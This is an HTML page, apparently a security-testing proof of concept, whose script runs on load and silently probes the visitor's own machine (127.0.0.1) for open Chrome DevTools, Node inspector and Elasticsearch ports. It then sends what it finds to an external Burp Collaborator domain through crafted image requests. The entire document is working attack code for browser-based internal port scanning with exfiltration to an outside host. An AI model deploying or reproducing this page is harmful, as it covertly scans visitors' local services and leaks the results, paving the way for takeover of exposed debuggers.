<!DOCTYPE html>
<html>
<head>
  <title>Debug Port Scanner</title>
</head>
<body>
  <h1>Scanning for open debugger ports...</h1>
  <div id="result">Scanning...</div>

  <script>
    const collaboratorDomain = '457mfhvylme5j9ytk1x6ns9j1a72v3js.oastify.com';
    const ports = [9200, 9222, 9223, 9229]; // includes 9200
    const paths = ['json', 'json/list', 'favicon.ico'];
    let found = false;

    function sendToCollaborator(message) {
      const img = new Image();
      img.src = `http://${message}.${collaboratorDomain}/`;
    }

    function testPortPath(port, path) {
      return new Promise(resolve => {
        const url = `http://127.0.0.1:${port}/${path}?t=${Date.now()}`;
        const img = new Image();

        img.onload = () => resolve({ port, path, status: 'open' });
        img.onerror = () => resolve({ port, path, status: 'closed' });

        try {
          img.src = url;
        } catch (e) {
          resolve({ port, path, status: 'blocked' });
        }

        setTimeout(() => resolve({ port, path, status: 'timeout' }), 3000);
      });
    }

    (async () => {
      const results = [];

      for (const port of ports) {
        for (const path of paths) {
          const result = await testPortPath(port, path);
          results.push(result);

          if (result.status === 'open' && !found) {
            found = true;
            document.getElementById('result').innerText =
              `Found open port ${port} on path /${path}`;
            sendToCollaborator(`open-${port}-${path.replace(/\W/g, '')}`);
          }
        }
      }

      if (!found) {
        document.getElementById('result').innerText =
          'No open ports detected.';
        sendToCollaborator('no-open-port');
      }

      console.log('Scan results:', results);
    })();
  </script>
</body>
</html>
